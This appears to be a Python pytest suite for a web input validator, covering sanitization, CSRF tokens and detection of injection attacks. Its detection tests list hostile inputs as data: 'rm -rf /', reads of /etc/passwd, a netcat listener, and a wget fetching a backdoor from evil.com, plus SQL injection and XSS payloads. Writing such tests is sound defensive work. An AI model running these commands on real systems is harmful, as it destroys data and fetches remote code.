"""Tests for security validation components in standalone_enhanced_main.py."""

import hashlib
import os
import re
import secrets

# Import the security components
import sys
import time
from unittest.mock import Mock, patch

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from standalone_enhanced_main import (
    BasicSecurityValidator,
    SecurityLevel,
    ValidationResult,
    ValidationViolation,
)


class TestSecurityLevel:
    """Test the SecurityLevel enum."""

    def test_security_level_values(self):
        """Test that SecurityLevel has correct values."""
        assert SecurityLevel.LOW == "low"
        assert SecurityLevel.MEDIUM == "medium"
        assert SecurityLevel.HIGH == "high"
        assert SecurityLevel.CRITICAL == "critical"

    def test_security_level_comparison(self):
        """Test that SecurityLevel values can be compared."""
        assert SecurityLevel.LOW == "low"
        assert SecurityLevel.CRITICAL == "critical"
        assert SecurityLevel.HIGH != SecurityLevel.LOW


class TestValidationViolation:
    """Test the ValidationViolation model."""

    def test_validation_violation_creation(self):
        """Test creating a ValidationViolation instance."""
        violation = ValidationViolation(
            type="XSS",
            severity=SecurityLevel.HIGH,
            message="Test violation",
            field="test_field",
        )

        assert violation.type == "XSS"
        assert violation.severity == SecurityLevel.HIGH
        assert violation.message == "Test violation"
        assert violation.field == "test_field"
        assert violation.value is None
        assert violation.pattern is None

    def test_validation_violation_with_optional_fields(self):
        """Test creating a ValidationViolation with optional fields."""
        violation = ValidationViolation(
            type="SQL_INJECTION",
            severity=SecurityLevel.CRITICAL,
            message="SQL injection detected",
            field="query",
            value="'; DROP TABLE users; --",
            pattern=r"(\'\s*;\s*--)",
        )

        assert violation.type == "SQL_INJECTION"
        assert violation.severity == SecurityLevel.CRITICAL
        assert violation.message == "SQL injection detected"
        assert violation.field == "query"
        assert violation.value == "'; DROP TABLE users; --"
        assert violation.pattern == r"(\'\s*;\s*--)"


class TestValidationResult:
    """Test the ValidationResult model."""

    def test_validation_result_valid(self):
        """Test creating a valid ValidationResult."""
        result = ValidationResult(is_valid=True, sanitized_value="clean input")

        assert result.is_valid is True
        assert result.sanitized_value == "clean input"
        assert result.violations == []
        assert result.security_score == 1.0

    def test_validation_result_with_violations(self):
        """Test creating a ValidationResult with violations."""
        violations = [
            ValidationViolation(
                type="XSS",
                severity=SecurityLevel.HIGH,
                message="XSS detected",
                field="input",
            )
        ]

        result = ValidationResult(
            is_valid=False,
            sanitized_value="&lt;script&gt;alert('xss')&lt;/script&gt;",
            violations=violations,
            security_score=0.7,
        )

        assert result.is_valid is False
        assert "&lt;script&gt;" in result.sanitized_value
        assert len(result.violations) == 1
        assert result.violations[0].type == "XSS"
        assert result.security_score == 0.7


class TestBasicSecurityValidator:
    """Test the BasicSecurityValidator class."""

    def setup_method(self):
        """Set up test fixtures."""
        self.validator = BasicSecurityValidator()

    def test_validator_initialization(self):
        """Test that validator initializes properly."""
        assert isinstance(self.validator.csrf_tokens, dict)
        assert len(self.validator.csrf_tokens) == 0

        # Check that security patterns are loaded
        assert len(self.validator.xss_patterns) > 0
        assert len(self.validator.sql_patterns) > 0
        assert len(self.validator.command_patterns) > 0

    def test_sanitize_input_basic(self):
        """Test basic input sanitization."""
        result = self.validator.sanitize_input("<script>alert('xss')</script>")

        # Due to order of sanitization, & is encoded first, then < and > are encoded
        assert "&amp;lt;script&amp;gt;" in result
        assert "&amp;lt;/script&amp;gt;" in result
        assert (
            "&amp;#x27;xss&amp;#x27;" in result
        )  # Single quotes become &#x27; then &amp;#x27;

    def test_sanitize_input_special_characters(self):
        """Test sanitization of special characters."""
        input_text = "<>&\"'\x00"
        result = self.validator.sanitize_input(input_text)

        # Due to order of sanitization, & is encoded first, then < and > are encoded
        assert "&amp;lt;" in result
        assert "&amp;gt;" in result
        assert "&amp;&amp;" in result  # & becomes &amp;, then another & becomes &amp;
        assert "&amp;quot;" in result
        assert "&amp;#x27;" in result  # ' becomes &#x27;, then & becomes &amp;
        assert "\x00" not in result

    def test_sanitize_input_length_limit(self):
        """Test that sanitize_input limits length to 1000 characters."""
        long_input = "A" * 2000
        result = self.validator.sanitize_input(long_input)

        assert len(result) == 1000
        assert result == "A" * 1000

    def test_sanitize_input_non_string(self):
        """Test sanitizing non-string input."""
        result = self.validator.sanitize_input(12345)
        assert result == "12345"

        result = self.validator.sanitize_input(None)
        assert result == "None"

    def test_validate_input_clean(self):
        """Test validating clean input."""
        result = self.validator.validate_input("clean input text", "message")

        assert result.is_valid is True
        assert result.sanitized_value == "clean input text"
        assert len(result.violations) == 0
        assert result.security_score == 1.0

    def test_validate_input_xss_detection(self):
        """Test XSS detection in input validation."""
        xss_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<iframe src='evil.com'></iframe>",
            "onload=alert('xss')",
            "eval('malicious code')",
        ]

        for xss_input in xss_inputs:
            result = self.validator.validate_input(xss_input, "test_field")

            assert result.is_valid is False
            assert len(result.violations) > 0
            assert any(v.type == "XSS" for v in result.violations)
            assert any(v.severity == SecurityLevel.HIGH for v in result.violations)
            assert result.security_score < 1.0

    def test_validate_input_sql_injection_detection(self):
        """Test SQL injection detection in input validation."""
        sql_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "INSERT INTO users VALUES",
            "DELETE FROM accounts WHERE",
        ]

        for sql_input in sql_inputs:
            result = self.validator.validate_input(sql_input, "query")

            assert result.is_valid is False
            assert len(result.violations) > 0
            assert any(v.type == "SQL_INJECTION" for v in result.violations)
            assert any(v.severity == SecurityLevel.CRITICAL for v in result.violations)
            assert result.security_score < 1.0

    def test_validate_input_command_injection_detection(self):
        """Test command injection detection in input validation."""
        command_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc -l 1234",
            "test `whoami`",
            "test ../../../etc/passwd",
            "test && wget http://evil.com/backdoor",
        ]

        for command_input in command_inputs:
            result = self.validator.validate_input(command_input, "filename")

            assert result.is_valid is False
            assert len(result.violations) > 0
            assert any(v.type == "COMMAND_INJECTION" for v in result.violations)
            assert any(v.severity == SecurityLevel.CRITICAL for v in result.violations)
            assert result.security_score < 1.0

    def test_validate_input_multiple_violations(self):
        """Test input with multiple types of violations."""
        malicious_input = "<script>alert('xss')</script>'; DROP TABLE users; --"
        result = self.validator.validate_input(malicious_input, "evil_field")

        assert result.is_valid is False
        assert len(result.violations) >= 2

        violation_types = [v.type for v in result.violations]
        assert "XSS" in violation_types
        assert "SQL_INJECTION" in violation_types

        # Security score should be very low due to multiple critical violations
        assert result.security_score < 0.5

    def test_validate_input_security_score_calculation(self):
        """Test security score calculation with different violation severities."""
        # Test with SQL injection that triggers both SQL and command injection patterns
        # The input '; DROP TABLE users; --' matches both SQL patterns and the ';' command pattern
        critical_input = "'; DROP TABLE users; --"
        result = self.validator.validate_input(critical_input, "test")
        # This has 2 critical violations (SQL + command injection), so score = 1.0 - (2 * 0.5) = 0.0
        assert result.security_score == 0.0

        # Test with a pure XSS violation (high severity)
        high_input = "<script>alert('xss')</script>"
        result = self.validator.validate_input(high_input, "test")
        expected_score = 1.0 - (1 * 0.3)  # One high violation
        assert abs(result.security_score - expected_score) < 0.01

    def test_validate_input_non_string(self):
        """Test validating non-string input."""
        result = self.validator.validate_input(12345, "number_field")

        assert result.is_valid is True
        assert result.sanitized_value == "12345"
        assert len(result.violations) == 0

    @patch("time.time")
    @patch("secrets.token_urlsafe")
    @patch("hashlib.sha256")
    def test_generate_csrf_token(self, mock_sha256, mock_token, mock_time):
        """Test CSRF token generation."""
        # Mock dependencies
        mock_time.return_value = 1000.0
        mock_token.return_value = "test_token_12345"
        mock_hash = Mock()
        mock_hash.hexdigest.return_value = "test_request_id"
        mock_sha256.return_value = mock_hash

        # Mock request
        mock_request = Mock()
        mock_request.client.host = "127.0.0.1"

        token = self.validator.generate_csrf_token(mock_request)

        assert token == "test_token_12345"
        assert token in self.validator.csrf_tokens

        token_data = self.validator.csrf_tokens[token]
        assert token_data["request_id"] == "test_request_id"
        assert token_data["created_at"] == 1000.0
        assert token_data["expires_at"] == 4600.0  # 1000 + 3600
        assert token_data["client_ip"] == "127.0.0.1"

    @patch("time.time")
    def test_validate_csrf_token_valid(self, mock_time):
        """Test validating a valid CSRF token."""
        mock_time.return_value = 1000.0

        # Create a mock request
        mock_request = Mock()
        mock_request.client.host = "127.0.0.1"

        # Manually add a token to simulate generation
        token = "valid_token"
        self.validator.csrf_tokens[token] = {
            "request_id": "test_id",
            "created_at": 1000.0,
            "expires_at": 4600.0,
            "client_ip": "127.0.0.1",
        }

        result = self.validator.validate_csrf_token(token, mock_request)
        assert result is True

    @patch("time.time")
    def test_validate_csrf_token_expired(self, mock_time):
        """Test validating an expired CSRF token."""
        # Set current time to after expiration
        mock_time.return_value = 5000.0

        mock_request = Mock()
        mock_request.client.host = "127.0.0.1"

        # Add an expired token
        token = "expired_token"
        self.validator.csrf_tokens[token] = {
            "request_id": "test_id",
            "created_at": 1000.0,
            "expires_at": 4600.0,  # Expired at time 4600
            "client_ip": "127.0.0.1",
        }

        result = self.validator.validate_csrf_token(token, mock_request)
        assert result is False
        assert token not in self.validator.csrf_tokens  # Should be deleted

    def test_validate_csrf_token_nonexistent(self):
        """Test validating a non-existent CSRF token."""
        mock_request = Mock()
        mock_request.client.host = "127.0.0.1"

        result = self.validator.validate_csrf_token("nonexistent_token", mock_request)
        assert result is False

    def test_validate_csrf_token_empty(self):
        """Test validating empty or None CSRF token."""
        mock_request = Mock()
        mock_request.client.host = "127.0.0.1"

        assert self.validator.validate_csrf_token("", mock_request) is False
        assert self.validator.validate_csrf_token(None, mock_request) is False

    @patch("time.time")
    def test_validate_csrf_token_ip_mismatch_warning(self, mock_time):
        """Test CSRF token validation with IP mismatch (should warn but still validate)."""
        mock_time.return_value = 1000.0

        mock_request = Mock()
        mock_request.client.host = "192.168.1.1"  # Different IP

        token = "ip_mismatch_token"
        self.validator.csrf_tokens[token] = {
            "request_id": "test_id",
            "created_at": 1000.0,
            "expires_at": 4600.0,
            "client_ip": "127.0.0.1",  # Original IP
        }

        with patch("standalone_enhanced_main.logger") as mock_logger:
            result = self.validator.validate_csrf_token(token, mock_request)

            assert result is True  # Still validates
            mock_logger.warning.assert_called_once()
            assert (
                "CSRF token client IP mismatch" in mock_logger.warning.call_args[0][0]
            )


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
